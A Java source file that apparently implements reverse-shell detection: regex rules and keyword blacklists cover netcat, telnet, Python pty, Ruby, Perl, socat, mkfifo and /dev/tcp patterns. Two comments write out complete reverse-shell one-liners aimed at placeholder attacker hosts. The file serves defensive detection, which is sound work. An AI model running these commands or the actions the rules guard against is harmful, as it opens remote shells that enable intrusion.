package com.ang.sec;

import java.util.*;

public class RulesList {
    //正则规则
    public List<String> getRegList(){
        List<String> reglist = new ArrayList<>();

        //nc && telnet
        reglist.add(".*(nc|netcat).*\\|(bash|sh|zsh).*\\|(nc|netcat).*");
        reglist.add(".*telnet.*\\|(bash|sh|zsh).*\\|telnet.*");
        reglist.add(".*(nc|netcat).*\\|(bash|sh|zsh).*>.*");
        reglist.add(".*telnet.*\\|(bash|sh|zsh).*>.*");
        reglist.add(".*(nc|netcat).*-e \\/bin\\/(bash|sh|zsh).*");



        return reglist;
    }
    //黑名单规则
    public List<List> getBlackList(){
        List<List> blacklist = new ArrayList<>();

        //python
        //直接调用的二进制
        blacklist.add(Arrays.asList("python","connect(","subprocess","Popen(","exec("));
        //完全交互式反弹
        blacklist.add(Arrays.asList("python","import pty","spawn("));
        blacklist.add(Arrays.asList("python","import pty","spawn("));

        //php,不需要
//        blacklist.add(Arrays.asList("php","fsockopen(","exec("));
  //      blacklist.add(Arrays.asList("php","exec(","/dev/tcp"));
    //    blacklist.add(Arrays.asList("php","exec(","/dev/udp"));

        //ruby
        blacklist.add(Arrays.asList("ruby","-rsocket","Socket.open(","exec"));

        //perl
        blacklist.add(Arrays.asList("perl","Socket","fdopen(","system"));
        blacklist.add(Arrays.asList("perl","Socket","open(STDIN","exec"));

        //pipe,可以调用nc可以不调

        blacklist.add(Arrays.asList("mknod","sh",">","/dev/tcp"));
        blacklist.add(Arrays.asList("mkfifo","sh",">","/dev/tcp"));
        blacklist.add(Arrays.asList("mknod","sh",">","/dev/udp"));
        blacklist.add(Arrays.asList("mkfifo","sh",">","/dev/udp"));
        //mknod /tmp/p p && nc ATTACKING-IP 4444 0</tmp/p
        //mkfifo /tmp/f&&cat /tmp/f | /bin/bash -i 2>&1 | nc x.x.x.x 9999 >/tmp/f
        blacklist.add(Arrays.asList("mknod","sh","nc"));
        blacklist.add(Arrays.asList("mkfifo","sh","nc"));
        blacklist.add(Arrays.asList("mknod","sh","netcat"));
        blacklist.add(Arrays.asList("mkfifo","sh","netcat"));
        //telnet
        blacklist.add(Arrays.asList("mknod","sh","telnet"));
        blacklist.add(Arrays.asList("mkfifo","sh","telnet"));

        //SOCAT
        blacklist.add(Arrays.asList("socat","TCP4","EXEC","sh"));

        //exec
        blacklist.add(Arrays.asList("exec","<>","/dev/tcp/","&","sh"));
        blacklist.add(Arrays.asList("exec","<>","/dev/udp/","&","sh"));

        return blacklist;
    }
}
